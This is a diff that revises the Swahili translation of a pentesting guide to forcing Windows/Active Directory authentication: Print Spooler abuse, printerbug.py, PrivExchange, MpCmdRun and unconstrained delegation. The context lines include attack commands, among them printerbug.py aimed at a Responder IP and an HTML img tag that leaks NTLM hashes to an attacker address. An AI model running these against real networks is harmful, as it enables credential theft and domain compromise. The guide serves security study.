@@ -8,7 +8,7 @@
 
 ## Spooler Service Abuse
 
-Ikiwa huduma ya _**Print Spooler**_ ime **wezeshwa,** unaweza kutumia baadhi ya akidi za AD zinazojulikana tayari ili **kuomba** kwa seva ya uchapishaji ya Domain Controller **sasisho** kuhusu kazi mpya za uchapishaji na kumwambia tu **aitumie arifa kwa mfumo fulani**.\
+Ikiwa huduma ya _**Print Spooler**_ ime **wezeshwa,** unaweza kutumia baadhi ya akidi za AD zinazojulikana tayari ili **kuomba** kwa seva ya uchapishaji ya Domain Controller **sasisho** kuhusu kazi mpya za uchapishaji na umwambie tu **atumie arifa kwa mfumo fulani**.\
 Kumbuka wakati printer inatuma arifa kwa mifumo isiyo ya kawaida, inahitaji **kujiuthibitisha dhidi ya** hiyo **sistema**. Hivyo, mshambuliaji anaweza kufanya huduma ya _**Print Spooler**_ kujiuthibitisha dhidi ya mfumo wowote, na huduma hiyo itatumia **akaunti ya kompyuta** katika uthibitishaji huu.
 
 ### Finding Windows Servers on the domain
@@ -17,7 +17,7 @@ Kwa kutumia PowerShell, pata orodha ya masanduku ya Windows. Seva mara nyingi ni
 ```bash
 Get-ADComputer -Filter {(OperatingSystem -like "*windows*server*") -and (OperatingSystem -notlike "2016") -and (Enabled -eq "True")} -Properties * | select Name | ft -HideTableHeaders > servers.txt
 ```
-### Kupata huduma za Spooler zinazosikiliza
+### Kupata huduma za Spooler zinazotafuta
 
 Kwa kutumia toleo lililobadilishwa kidogo la @mysmartlogin's (Vincent Le Toux's) [SpoolerScanner](https://github.com/NotMedic/NetNTLMtoSilverTicket), angalia kama Huduma ya Spooler inasikiliza:
 ```bash
@@ -41,7 +41,7 @@ printerbug.py 'domain/username:password'@<Printer IP> <RESPONDERIP>
 ```
 ### Kuunganisha na Uwakilishi Usio na Kikomo
 
-Ikiwa mshambuliaji tayari ameathiri kompyuta yenye [Uwakilishi Usio na Kikomo](unconstrained-delegation.md), mshambuliaji anaweza **kufanya printer ithibitishwe dhidi ya kompyuta hii**. Kwa sababu ya uwakilishi usio na kikomo, **TGT** ya **akaunti ya kompyuta ya printer** itakuwa **imehifadhiwa katika** **kumbukumbu** ya kompyuta yenye uwakilishi usio na kikomo. Kwa kuwa mshambuliaji tayari ameathiri mwenyeji huyu, ataweza **kurejesha tiketi hii** na kuitumia vibaya ([Pass the Ticket](pass-the-ticket.md)).
+Ikiwa mshambuliaji tayari ameathiri kompyuta yenye [Uwakilishi Usio na Kikomo](unconstrained-delegation.md), mshambuliaji anaweza **kufanya printer ithibitishwe dhidi ya kompyuta hii**. Kwa sababu ya uwakilishi usio na kikomo, **TGT** ya **akaunti ya kompyuta ya printer** itakuwa **imehifadhiwa katika** **kumbukumbu** ya kompyuta yenye uwakilishi usio na kikomo. Kwa kuwa mshambuliaji tayari ameathiri mwenyeji huu, ataweza **kurejesha tiketi hii** na kuitumia vibaya ([Pass the Ticket](pass-the-ticket.md)).
 
 ## RCP Kulazimisha uthibitisho
 
@@ -51,13 +51,13 @@ https://github.com/p0dalirius/Coercer
 
 ## PrivExchange
 
-Shambulio la `PrivExchange` ni matokeo ya kasoro iliyopatikana katika **kipengele cha `PushSubscription` cha Exchange Server**. Kipengele hiki kinaruhusu server ya Exchange kulazimishwa na mtumiaji yeyote wa kikoa mwenye sanduku la barua kuthibitisha kwa mwenyeji wowote uliopewa na mteja kupitia HTTP.
+Shambulio la `PrivExchange` ni matokeo ya kasoro iliyopatikana katika kipengele cha **Exchange Server `PushSubscription`**. Kipengele hiki kinaruhusu server ya Exchange kulazimishwa na mtumiaji yeyote wa kikoa mwenye sanduku la barua kuthibitisha kwa mwenyeji wowote uliopewa na mteja kupitia HTTP.
 
-Kwa kawaida, **huduma ya Exchange inafanya kazi kama SYSTEM** na inapewa mamlaka kupita kiasi (hasa, ina **mamlaka ya WriteDacl kwenye kikoa kabla ya Sasisho la Jumla la 2019**). Kasoro hii inaweza kutumika kuboresha **kuhamasisha taarifa kwa LDAP na kisha kutoa hifadhidata ya NTDS ya kikoa**. Katika hali ambapo kuhamasisha kwa LDAP haiwezekani, kasoro hii bado inaweza kutumika kuhamasisha na kuthibitisha kwa wenyeji wengine ndani ya kikoa. Ufanisi wa shambulio hili unatoa ufikiaji wa haraka kwa Msimamizi wa Kikoa na akaunti yoyote ya mtumiaji wa kikoa iliyoidhinishwa.
+Kwa kawaida, **huduma ya Exchange inafanya kazi kama SYSTEM** na inapewa mamlaka kupita kiasi (hasa, ina **WriteDacl privileges kwenye kikoa kabla ya Sasisho la Jumla la 2019**). Kasoro hii inaweza kutumika kuboresha **kuhamasisha taarifa kwa LDAP na kisha kutoa hifadhidata ya NTDS ya kikoa**. Katika hali ambapo kuhamasisha kwa LDAP haiwezekani, kasoro hii bado inaweza kutumika kuhamasisha na kuthibitisha kwa wenyeji wengine ndani ya kikoa. Utekelezaji wa mafanikio wa shambulio hili unatoa ufikiaji wa haraka kwa Msimamizi wa Kikoa na akaunti yoyote ya mtumiaji wa kikoa iliyoidhinishwa.
 
 ## Ndani ya Windows
 
-Ikiwa tayari uko ndani ya mashine ya Windows unaweza kulazimisha Windows kuungana na server kwa kutumia akaunti zenye mamlaka na: 
+Ikiwa tayari uko ndani ya mashine ya Windows unaweza kulazimisha Windows kuungana na server kwa kutumia akaunti zenye mamlaka kwa:
 
 ### Defender MpCmdRun
 ```bash
@@ -102,7 +102,7 @@ Ikiwa unaweza kufanya shambulio la MitM kwa kompyuta na kuingiza HTML kwenye uku
 ```html
 <img src="\\10.10.17.231\test.ico" height="1" width="1" />
 ```
-## Njia nyingine za kulazimisha na kudanganya uthibitishaji wa NTLM
+## Njia nyingine za kulazimisha na kuiba uthibitisho wa NTLM
 
 {{#ref}}
 ../ntlm/places-to-steal-ntlm-creds.md
